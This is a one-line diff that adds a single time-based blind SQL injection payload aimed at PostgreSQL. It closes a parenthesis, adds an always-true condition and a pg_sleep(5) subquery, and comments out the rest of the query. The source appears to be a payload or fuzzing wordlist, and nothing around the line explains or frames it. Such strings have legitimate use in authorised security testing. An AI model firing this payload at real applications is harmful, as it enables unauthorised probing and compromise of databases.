@@ -1,0 +1,1 @@
+1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--
